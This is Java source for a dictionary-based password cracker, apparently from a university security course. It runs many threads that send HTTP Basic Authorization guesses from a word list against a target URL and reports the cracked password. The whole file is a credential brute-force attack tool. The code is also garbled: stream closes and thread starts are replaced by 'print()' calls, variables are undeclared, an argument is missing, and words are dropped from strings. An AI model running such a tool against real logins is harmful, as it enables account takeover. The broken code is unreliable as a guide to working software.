

import java.util.*;
import java.*;
import java.awt.*;
import java.net.*;
import java.io.*;
import java.text.*;

public class Dictionary {
    
    
    
    public static String Base64Encode(String s) {
        byte[] bb = s.getBytes();
        byte[] b  = bb;
        char[] table = { 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
        'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
        '0','1','2','3','4','5','6','7','8','9','+','/' };
        if (bb.length % 3!=0) {
            int x1 = bb.length;
            
            b = new byte[(x1/3+1)*3];
            int x2 = b.length;
            
            for(int i=0;i<x1;i++)
                b[i] = bb[i];
            for(int i=x1;i<x2;i++)
                b[i] = 0;
        }
        
        char[] c = new char[b.length/3*4];
        
        int i=0, j=0;
        while (i+3<=b.length) {
            c[j]     = table[(b[i]   >>  2)];
            c[j+1]   = table[(b[i+1] >>  4) | ((b[i]   &  3) << 4)];
            c[j+2]   = table[(b[i+2] >>  6) | ((b[i+1] & 15) << 2)];
            c[j+3]   = table[(b[i+2] &  63)];
            i+=3;
            j+=4;
        }
        
        j = c.length-1;
        while (c[j]=='A') {
            c[j]='=';
            j--;
        }
        
        return String.valueOf(c);
    }
    
    
    public synchronized void getAccumulatedLocalAttempt() {
        attempt = 0;
        for (int i=0;i<MAXTHREAD;i++) {
            attempt += threads[i].getLocalAttempt();
        }
    }
    
    
    public synchronized void printStatusReport(String Attempt, String currprogress,String ovrl, double[] attmArr, int idx) {
        DecimalFormat fmt = new DecimalFormat();
        fmt.applyPattern("0.00");
        
        System.out.println();
        System.out.println(" ------------------------ [ CURRENT STATISTICS ] ---------------------------");
        System.out.println();
        System.out.println("  Current connections   : "+curconn);
        System.out.println("  Current progress      : "+attempt+ " of "+ALLCOMBI+" ("+currprogress+"%)");
        System.out.println("  Overall Attempts rate : "+ovrl+" attempts  second (approx.)");
        System.out.println();
        System.out.println(" ---------------------------------------------------------------------------");
        System.out.println();
    }
    
    
    public class MyTT extends TimerTask {
        
        public synchronized void run() {
            
            
            if (count==REPORT_INTERVAL) {
                
                DecimalFormat fmt = new DecimalFormat();
                fmt.applyPattern("0.00");
                
                
                getAccumulatedLocalAttempt();
                double p = (double)attempt/(double)ALLCOMBI*100;
                
                
                double aps = (double) (attempt - attm) / REPORT_INTERVAL;
                
                
                attmArr[attmArrIdx++] = aps;
                
                
                printStatusReport(String.valueOf(attempt),fmt.format(p),fmt.format(getOverallAttemptPerSec()),attmArr,attmArrIdx);
                count = 0;
            } else
                
                if (count==0) {
                    getAccumulatedLocalAttempt();
                    attm = attempt;
                    count++;
                } else {
                    count++;
                }
        }
        
        
        
        public synchronized double getOverallAttemptPerSec() {
            double val = 0;
            
            if (attmArrIdx==0) {
                return attmArrIdx;
            } else {
                for (int i=0;i<attmArrIdx;i++) {
                     val+= attmArr[i];
                }
                return  val / attmArrIdx;
            }
        }
        
        private int      count = 0;
        private    int  attm;
        private int      attmArrIdx = 0;
        private double[] attmArr = new double[2*60*60/10]; 
    }
    
    
    public synchronized void interruptAll(int ID) {
        for (int i=0;i<MAXTHREAD;i++) {
            if ((threads[i].isAlive()) && (i!=ID)) {
                threads[i].interrupt();
            }
            notifyAll();
        }
    }
    
    
    
    public synchronized void setSuccess(int ID, String p) {
        passw   = p;
        success = ID;
        notifyAll();
        interruptAll(ID);
        
        
        end = System.currentTimeMillis();
    }
    
    
    public synchronized boolean isSuccess() {
        return (success>=0);
    }
    
    
    
    public synchronized void waitUntilAllTerminated() {
        while (curconn>0) {
            try {
                wait();
            } catch (InterruptedException e) {}
        }
    }
    
    
    
    
    public synchronized int waitUntilOK2Connect() {
        boolean interruptd= false;
        int idx = -1;
        
        
        
        
        while (curconn>=MAXCONN) {
            try {
                wait();
            } catch (InterruptedException e) { interruptd = true; }
        }
        
        
        
        if (!interruptd) {
            
            curconn++;
            for (idx=0;idx<MAXCONN;idx++)
                if (!connused[idx]) {
                    connused[idx] = true;
                    break;
                }
            
            notifyAll();
        }
        
        
        return idx;
    }
    
    
    public synchronized void decreaseConn(int idx) {
        curconn--;
        connused[idx] = false;
        
        
        notifyAll();
    }
    
    
    
    
    public String[] fetchWords( int idx,int n) {
        String[] result = new String[n];
        try {
            
            BufferedReader b = new BufferedReader(new FileReader(TEMPDICT));
            
            for (int i=0;i<idx;i++) { b.readLine(); }
            
            for (int i=0;i<n;i++) {
                result[i] = b.readLine();
            }
            
            b.print();
        } catch (FileNotFoundException e) {
            System.out.println(e);
            System.exit(0);
        } catch (IOException e) {}
        return result;
    }
    
    
    public String fetchWord( int idx) {
        String result = null;
        try {
            
            BufferedReader b = new BufferedReader(new FileReader(TEMPDICT));
            
            for (int i=0;i<idx;i++) { b.readLine(); }
            
            result = b.readLine();
            
            b.print();
        } catch (FileNotFoundException e) {
            System.out.println(e);
            System.exit(0);
        } catch (IOException e) {}
        return result;
    }
    
    
    public static void readThroughDictionary() {
        try {
            
            BufferedReader b = new BufferedReader(new FileReader(DICTIONARY));
            PrintWriter w    = new PrintWriter(new BufferedWriter(new FileWriter(TEMPDICT)));
            String s;
            
            ALLCOMBI = 0;
            while ((s=b.readLine())!=null) {
                if ((s.length()>=MINCHAR) && (s.length()<=MAXCHAR)) {
                    w.println(s);
                    ALLCOMBI++;
                }
            }
            b.print();
            w.print();
        } catch (FileNotFoundException e) {
            System.out.println("Unable  open the DICTIONARY file '"+DICTIONARY+"'");
            System.exit(0);
        } catch (IOException e) {
            System.out.println("Error in  the DICTIONARY file '"+DICTIONARY+"'");
            System.exit(0);
        }
    }
    
    
    
    
    
    public class ThCrack extends Thread {
        
        
        public ThCrack(int threadID, int startidx, int endidx) {
            super(" Thread #"+String.valueOf(threadID)+": ");
            this.ID       = threadID;
            this.startidx = startidx;
            this.endidx   = endidx;
            
            
            if (endidx>=startidx+MAXCACHE-1) {
                this.localDict = new String[MAXCACHE];
                this.localDict = fetchWords(startidx,MAXCACHE);
                lastFetchIdx   = startidx+MAXCACHE-1;
            } else {
                this.localDict = new String[(int)(endidx-startidx+1)];
                this.localDict = fetchWords(startidx,(int)(endidx-startidx+1));
                lastFetchIdx   = endidx;
            }
            
            setDaemon(true);
        }
        
        
        public boolean launchRequest(String ID, int connID,String thePass) throws IOException, InterruptedException {
            int i;
            String msg;
            
            
            URL tryURL = new URL(THEURL);
            
            
            connections[connID]=(HttpURLConnection) tryURL.openConnection();
            
            
            connections[connID].setRequestProperty("Authorization"," "+Base64Encode(USERNAME+":"+thePass));
            
            
            i = connections[connID].getResponseCode();
            msg  = connections[connID].getResponseMessage();
            connections[connID].disconnect();
            
            
            if (i==HttpURLConnection.HTTP_OK) {
                
                System.out.println(ID+"Trying '"+thePass+"' GOTCHA !!! (= "+String.valueOf()+"-"+msg+").");
                setSuccess(this.ID,thePass);
                return (true);
            } else {
                
                System.out.println(ID+"Trying '"+thePass+"' FAILED (= "+String.valueOf()+"-"+msg+").");
                return (false);
            }
        }
        
        
        public void rest(int msec) {
            try { sleep(msec); } catch (InterruptedException e) {}
        }
        
        
        public String getCacheIdx(int idx) {
            if (idx<=lastFetchIdx) {
                return localDict[localDict.length-(int)(lastFetchIdx-idx)-1];
            } else {
                if (lastFetchIdx+localDict.length-1>endidx) {
                    this.localDict = fetchWords(lastFetchIdx+1,(int)(endidx-lastFetchIdx-1));
                    lastFetchIdx   = endidx;
                } else {
                    this.localDict = fetchWords(lastFetchIdx+1,localDict.length);
                    lastFetchIdx   = lastFetchIdx+localDict.length;
                }
                return localDict[localDict.length-(int)(lastFetchIdx-idx)-1];
            }
        }
        
        
        
        public String constructPassword(int idx) {
            return getCacheIdx(idx);
        }
        
        
        public String getStartStr() {
            return fetchWord(this.startidx);
        }
        
        
        public String getEndStr() {
            return fetchWord(this.endidx);
        }
        
        
        public void run() {
             i = startidx;
            boolean keeprunning = true;
            while ((!isSuccess()) && (i<=endidx) && (keeprunning)) {
                
                
                int idx = waitUntilOK2Connect();
                
                
                if (idx==-1) {
                    
                    break;
                }
                
                try {
                    
                    String s = constructPassword(i);
                    
                    if ((s.length()>=MINCHAR) && (s.length()<=MAXCHAR))
                        launchRequest(getName(), idx, s);
                    else
                        System.out.println(getName()+"skipping '"+s+"'");
                    
                    decreaseConn(idx);
                    
                    localattempt++;
                    
                    
                    rest(MAXCONN);
                    i++;
                } catch (InterruptedException e) {
                    
                    
                    keeprunning = false;
                    break;
                } catch (IOException e) {
                    
                    
                    
                    
                    
                    decreaseConn(idx);
                }
            }
            
            
            if (success==this.ID) {
                waitUntilAllTerminated();
            }
        }
        
        
        public int getLocalAttempt() {
            return localattempt;
        }
        
        private int startidx,endidx;
        private int ID;
        private int localattempt = 0;
        private String localDict[]; 
        private  int  lastFetchIdx;
    }
    
    
    public void printProgramHeader(String mode,int nThread) {
        System.out.println();
        System.out.println(" ********************** [ DICTIONARY CRACKING SYSTEM ] *********************");
        System.out.println();
        System.out.println("  URL         : "+THEURL);
        System.out.println("  Crack Mode  : "+mode);
        System.out.println("  . Char   : "+MINCHAR);
        System.out.println("  . Char   : "+MAXCHAR);
        System.out.println("  # of Thread : "+nThread);
        System.out.println("  Connections : "+MAXCONN);
        System.out.println("  All Combi.  : "+ALLCOMBI);
        System.out.println();
        System.out.println(" ***************************************************************************");
        System.out.println();
    }
    
    
    public void startNaiveCracking() {
        MAXTHREAD = 1;
        MAXCONN   = 1;
        startDistCracking();
    }
    
    
    public void startDistCracking() {
          int startidx,endidx;
        int   thcount;
        
        
        if (isenhanced) {
            printProgramHeader("ENHANCED DICTIONARY CRACKING ALGORITHM",MAXTHREAD);
        } else {
            printProgramHeader("NAIVE DICTIONARY CRACKING ALGORITHM",MAXTHREAD);
        }
        
        
        
        
        
        
        
        
        if (MAXTHREAD>ALLCOMBI) { MAXTHREAD = (int) (ALLCOMBI); }
         mult = (ALLCOMBI) / MAXTHREAD;
        
        
         i = System.currentTimeMillis();
        
        
        for (thcount=0;thcount<MAXTHREAD-1;thcount++) {
            startidx = thcount*mult;
            endidx   = (thcount+1)*mult-1;
            threads[thcount] = new ThCrack(thcount, startidx, endidx);
            System.out.println(threads[thcount].getName()+" try  crack from '"+threads[thcount].getStartStr()+"'  '"+threads[thcount].getEndStr()+"'");
        }
        
        
        
        
        
        startidx = (MAXTHREAD-1)*mult;
        endidx   = ALLCOMBI-1;
        threads[MAXTHREAD-1] = new ThCrack(MAXTHREAD-1, startidx, endidx);
        System.out.println(threads[MAXTHREAD-1].getName()+" try  crack from '"+threads[MAXTHREAD-1].getStartStr()+"'  '"+threads[MAXTHREAD-1].getEndStr()+"'");
        
        System.out.println();
        System.out.println(" ***************************************************************************");
        System.out.println();
        
        
        for (int i=0;i<MAXTHREAD;i++)
            threads[i].print();
    }
    
    
    public Dictionary() {
        
        if (isenhanced) {
            startDistCracking();
        } else {
            startNaiveCracking();
        }
        
        
        reportTimer  = new java.util.Timer();
        MyTT      tt = new MyTT();
        reportTimer.schedule(tt,0,1000);
        
        
        while ((success==-1) && (attempt<ALLCOMBI)) {
            try { Thread.sleep(100); getAccumulatedLocalAttempt(); } catch (InterruptedException e) {  }
        }
        
        
        if (success==-1) {
            end = System.currentTimeMillis();
        }
        
        
        getAccumulatedLocalAttempt();
        
        double ovAps = tt.getOverallAttemptPerSec();
        DecimalFormat fmt = new DecimalFormat();
        fmt.applyPattern("0.00");
        
        
        reportTimer.cancel();
        
        
        try { Thread.sleep(1000); } catch (InterruptedException e) {  }
        
        
        synchronized (this) {
            if (success>=0) {
                System.out.println();
                System.out.println(" ********************* [ URL SUCCESSFULLY CRACKED !! ] *********************");
                System.out.println();
                System.out.println("  The password is     : "+passw);
                System.out.println("  Number of attempts  : "+attempt+" of "+ALLCOMBI+" total combinations");
                System.out.println("  Attempt position    : "+fmt.format((double)attempt/(double)ALLCOMBI*100)+"%");
                System.out.println("  Overal attempt rate : "+fmt.format(ovAps)+ " attempts/sec");
                System.out.println("  Cracking time       : "+String.valueOf(((double)end-(double)d)/1000) + " seconds");
                System.out.println("  Worstcase time estd : "+fmt.format(1/ovAps*ALLCOMBI)+ " seconds");
                System.out.println();
                System.out.println(" ***************************************************************************");
                System.out.println();
            } else {
                System.out.println();
                System.out.println(" ********************* [ UNABLE  CRACK THE URL !!! ] *********************");
                System.out.println();
                System.out.println("  Number of attempts  : "+attempt+" of "+ALLCOMBI+" total combinations");
                System.out.println("  Attempt position    : "+fmt.format((double)attempt/(double)ALLCOMBI*100)+"%");
                System.out.println("  Overal attempt rate : "+fmt.format(ovAps)+ " attempts/sec");
                System.out.println("  Cracking time       : "+String.valueOf(((double)end-(double)d)/1000) + " seconds");
                System.out.println();
                System.out.println(" ***************************************************************************");
                System.out.println();
            }
        }
    }
    
    
    public static void printSyntax() {
        System.out.println();
        System.out.println("Syntax : Dictionary [mode] [URL] [] [] [username]");
        System.out.println();
        System.out.println("   mode     : (opt) 0 - NAIVE Dictionary mode");
        System.out.println("                        (trying from the first  the last combinations)");
        System.out.println("                    1 - ENHANCED Dictionary mode");
        System.out.println("                        (dividing cracking jobs  multiple threads) (default)");
        System.out.println("   URL      : (opt) the URL  crack ");
        System.out.println("                    (default : http://sec-crack.cs.rmit.edu./SEC/2/index.php)");
        System.out.println("   ,  : (optional) range of characters   applied in the cracking");
        System.out.println("                         where  1   <=  <= 255  (default  = 1)");
        System.out.println("                                 <=  <= 255  (default  = 3)");
        System.out.println("   username : (optional) the username that is used  crack");
        System.out.println();
        System.out.println("   NOTE: The optional parameters '','', and 'username'");
        System.out.println("         have   specified altogether  none at all.");
        System.out.println("         For example, if [] is specified, then [], and [username]");
        System.out.println("         have   specified as well. If none of them  specified,");
        System.out.println("         default values   used.");
        System.out.println();
        System.out.println("   Example of invocation :");
        System.out.println("         java Dictionary ");
        System.out.println("         java Dictionary 0");
        System.out.println("         java Dictionary 1 http://localhost/tryme.php");
        System.out.println("         java Dictionary 0 http://localhost/tryme.php 1 3 ");
        System.out.println("         java Dictionary 1 http://localhost/tryme.php 1 10 ");
        System.out.println();
        System.out.println();
    }
    
    
    public static void paramCheck(String[] args) {
        int argc = args.length;
        
        
        try {
            switch (Integer.valueOf(args[0]).intValue()) {
                case 0: {
                    isenhanced = false;
                } break;
                case 1: {
                    isenhanced = true;
                } break;
                default:
                    System.out.println("Syntax error : invalid mode '"+args[0]+"'");
                    printSyntax();
                    System.exit(1);
            }
        } catch (NumberFormatException e) {
            System.out.println("Syntax error : invalid number '"+args[0]+"'");
            printSyntax();
            System.exit(1);
        }
        
        if (argc>1) {
            try {
                
                URL u  = new URL(args[1]);
                
                
                try {
                    HttpURLConnection conn = (HttpURLConnection) u.openConnection();
                    
                    switch (conn.getResponseCode()) {
                       case  HttpURLConnection.HTTP_ACCEPTED:
                      case   HttpURLConnection.HTTP_OK:
                      case   HttpURLConnection.HTTP_NOT_AUTHORITATIVE:
                      case   HttpURLConnection.HTTP_FORBIDDEN:
                      case   HttpURLConnection.HTTP_UNAUTHORIZED:
                            break;
                        default:
                            
                            
                            System.out.println("Unable  open connection  the URL '"+args[1]+"'");
                            System.exit(1);
                    }
                } catch (IOException e) {
                    System.out.println(e);
                    System.exit(1);
                }
                
                THEURL = args[1];
            } catch (MalformedURLException e) {
                
                System.out.println("Invalid URL '"+args[1]+"'");
                printSyntax();
                System.exit(1);
            }
        }
        
        
        if (argc==5) {
            try {
                MINCHAR = Integer.valueOf(args[2]).intValue();
            } catch (NumberFormatException e) {
                System.out.println("Invalid  range number value '"+args[2]+"'");
                printSyntax();
                System.exit(1);
            }
            
            try {
                MAXCHAR = Integer.valueOf(args[3]).intValue();
            } catch (NumberFormatException e) {
                System.out.println("Invalid  range number value '"+args[3]+"'");
                printSyntax();
                System.exit(1);
            }
            
            if ((MINCHAR<1) || (MINCHAR>255)) {
                System.out.println("Invalid  range number value '"+args[2]+"' (must between 0 and 255)");
                printSyntax();
                System.exit(1);
            } else
                if (MINCHAR>MAXCHAR) {
                    System.out.println("Invalid  range number value '"+args[2]+"' (must lower than the  value)");
                    printSyntax();
                    System.exit(1);
                }
            
            if (MAXCHAR>255) {
                System.out.println("Invalid  range number value '"+args[3]+"' (must between  value and 255)");
                printSyntax();
                System.exit(1);
            }
            
            USERNAME = args[4];
        } else
            if ((argc>2) && (argc<5)) {
                System.out.println("Please specify the [], [], and [username] altogether  none at all");
                printSyntax();
                System.exit(1);
            } else
                if ((argc>2) && (argc>5)) {
                    System.out.println("The number of parameters expected is not more than 5. ");
                    System.out.println(" have specified more than 5 parameters.");
                    printSyntax();
                    System.exit(1);
                }
    }
    
    public static void main(String[] args) {
        MINCHAR   = 1;
        MAXCHAR   = 3; 
        
        
        if (args.length==0) {
            args    = new String[5];
            args[0] = String.valueOf(1); 
            args[1] = THEURL;
            args[2] = String.valueOf(MINCHAR);
            args[3] = String.valueOf(MAXCHAR);
            args[4] = USERNAME;
        }
        
        
        paramCheck(args);
        
        
        readThroughDictionary();
        
        
        Application = new Dictionary();
    }
    
    public static Dictionary Application;
    public static String    THEURL		= "http://sec-crack.cs.rmit.edu./SEC/2/index.php";
    public static String    DICTIONARY          = System.getProperty("user.dir")+"/words";
    public static String    TEMPDICT            = System.getProperty("user.dir")+"/~words";
    public static boolean   isenhanced;		
    public static String    passw		= "";	
    
    public static final int REPORT_INTERVAL = 1;  
    public static int       MAXTHREAD =  50;      
    public static int       MAXCONN   =  50;      
    public static int	    curconn   =   0;      
    public static int       success   =  -1;      
    
    public static String    USERNAME = "";  
    public static int       MINCHAR;              
    public static int       MAXCHAR;              
    public static   int    ALLCOMBI;             
    
    public static  int  start    ,end;            
    public static int       MAXCACHE  = 100;      
    
    public static java.util.Timer   reportTimer;  
    public static HttpURLConnection connections[] = new HttpURLConnection[MAXCONN]; 
    public static boolean	    connused[]	  = new boolean[MAXCONN];           
    public        ThCrack[] threads               = new ThCrack[MAXTHREAD];         
    public static   int    attempt               = 0; 
    public static int    idxLimit;		  
}
